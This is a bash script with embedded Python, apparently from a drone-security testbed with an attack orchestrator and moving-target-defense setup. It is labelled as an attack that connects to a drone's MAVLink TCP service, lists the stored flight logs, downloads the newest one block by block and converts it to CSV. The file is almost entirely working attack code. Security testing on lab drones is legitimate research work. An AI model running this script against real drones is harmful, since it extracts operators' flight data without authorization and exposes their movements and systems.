#!/usr/bin/env bash
set -euo pipefail

# Attack: Flight Log Extraction (MAVLink Log Download & Conversion, MTD-aware)
# Target Service: DRONE_MAVLINK_TCP (Default Port 5760 assumed for reliable log transfer)

# --- MTD_INTERFACE_START (Mandatory dynamic target acquisition) ---
# Orchestrator가 TARGET_IP, TARGET_PORT, TARGET_SERVICE를 주입해야 합니다.
if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# 서비스 타입별 기본 포트 설정 (MAVLink TCP를 기본으로 가정)
case "${TARGET_SERVICE:-DRONE_MAVLINK_TCP}" in
    DRONE_MAVLINK_TCP)
        TARGET_PORT="${TARGET_PORT:-5760}"
        ;;
    DRONE_MAVLINK)
        TARGET_PORT="${TARGET_PORT:-14550}"
        ;;
    *)
        : # 다른 서비스는 Orchestrator가 포트 값을 넣어준다고 가정
        ;;
esac

echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK_TCP})"
# --- MTD_INTERFACE_END ---

# --- Common Log/BASE Setup ---
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then
    . "$BASE/00_env.sh"
else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
    mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }
    export -f log
fi

log "[ATTACK] id=flight-log-extraction src=Flight-Log-Extraction.md"

log "[BLOCK 1] type=python (Automated Latest Log Download)"

# Python 스크립트를 실행하여 최신 로그를 다운로드하고, 파일 경로를 쉘 변수로 캡처합니다.
# 다운로드 과정을 표준 출력 대신 표준 오류로 보내고, 최종 파일 경로만 표준 출력으로 내보냅니다.
DOWNLOADED_LOG_FILE=$(sudo python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
import sys
import time
from pymavlink import mavutil

# --- Dynamic Target Acquisition ---
if len(sys.argv) != 2:
    sys.exit(1)
    
target_ip, target_port_str = sys.argv[1].split(':', 1)
try:
    target_port = int(target_port_str)
except ValueError:
    print(f"[ERROR] Invalid port: {target_port_str}", file=sys.stderr)
    sys.exit(1)
# ----------------------------------

def download_latest_log(connection):
    print("[INFO] Requesting log list...", file=sys.stderr)
    # 로그 리스트 요청 (ID 0부터 0xffff까지)
    connection.mav.log_request_list_send(connection.target_system, connection.target_component, 0, 0xffff)
    
    latest_log = None
    timeout = time.time() + 10 # 10초 타임아웃 설정
    
    # 1. 최신 로그 (가장 큰 ID) 찾기
    while time.time() < timeout:
        msg = connection.recv_match(type=['LOG_ENTRY'], blocking=True, timeout=0.1)
        if msg:
            if latest_log is None or msg.id > latest_log.id:
                latest_log = msg
        elif latest_log is not None:
            # 첫 번째 LOG_ENTRY를 받은 후 잠시 메시지가 없으면 목록 수신 완료로 간주
            break
            
    if latest_log is None:
        return None

    log_id = latest_log.id
    log_size = latest_log.size
    filename = f"log_extracted_{log_id}.bin"

    print(f"[INFO] Latest Log ID: {log_id}, Size: {log_size} bytes. Starting download to {filename}", file=sys.stderr)

    # 2. 로그 블록 다운로드
    with open(filename, 'wb') as file:
        bytes_received = 0
        ofs = 0
        BLOCK_SIZE = 90
        
        while bytes_received < log_size:
            # 데이터 요청
            connection.mav.log_request_data_send(
                connection.target_system,
                connection.target_component,
                log_id,
                ofs,
                min(log_size - bytes_received, BLOCK_SIZE)
            )
            
            # LOG_DATA 응답 대기
            timeout_data = time.time() + 5
            received_block = False
            while time.time() < timeout_data:
                msg = connection.recv_match(type=['LOG_DATA'], blocking=True, timeout=0.1)
                
                if msg is None:
                    continue
                
                if msg.id == log_id and msg.ofs == ofs:
                    data = bytes(msg.data[:msg.count])
                    file.write(data)
                    bytes_received += len(data)
                    ofs += len(data)
                    
                    sys.stderr.write(f"[STATUS] Received {bytes_received}/{log_size} bytes ({100 * bytes_received / log_size:.2f}%)   \r")
                    sys.stderr.flush()
                    received_block = True
                    break
            
            if not received_block:
                print(f"\n[WARNING] Timeout receiving LOG_DATA at offset {ofs}. Retrying...", file=sys.stderr)
                time.sleep(1)

    print(f"\n[SUCCESS] Log {log_id} downloaded completely.", file=sys.stderr)
    return filename

if __name__ == "__main__":
    try:
        connection = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
        connection.wait_heartbeat(timeout=10)
        
        downloaded_file = download_latest_log(connection)
        
        if downloaded_file:
            # 쉘에서 캡처할 수 있도록 명확한 형식으로 파일 경로 출력
            print(f"DOWNLOAD_FILE_PATH:{downloaded_file}")

    except Exception as e:
        print(f"[CRITICAL ERROR] Execution failed: {e}", file=sys.stderr)
        sys.exit(1)
'PY' 2> >(log_err) ) # Python의 stderr(로그)를 bash log 함수로 리디렉션

# Python 스크립트의 표준 출력에서 파일 이름을 추출 (다운로드 파일 경로)
DOWNLOADED_FILENAME=$(echo "${DOWNLOADED_LOG_FILE}" | grep "DOWNLOAD_FILE_PATH" | cut -d ':' -f 2)

if [[ -z "${DOWNLOADED_FILENAME}" ]]; then
    log "[ERROR] Failed to download any flight log file. Aborting CSV conversion."
    exit 1
fi

log "[BLOCK 2] type=shell (Convert Downloaded Log to CSV)"

CSV_OUTPUT_DIR="logs_csv_$(date +%Y%m%d_%H%M%S)"
mkdir -p "${CSV_OUTPUT_DIR}"

log "Converting ${DOWNLOADED_FILENAME} to CSV in ${CSV_OUTPUT_DIR}..."

# mavlogdump.py 또는 bin2csv를 사용하여 변환 수행
# sudo bin2csv -o logs_csv log_1.bin (원본 스크립트 기반)
sudo bin2csv -o "${CSV_OUTPUT_DIR}" "${DOWNLOADED_FILENAME}"

log "[BLOCK 3] type=control (Extraction and Conversion Completed)"
log "Flight log data successfully extracted, converted, and stored in the ${CSV_OUTPUT_DIR} directory."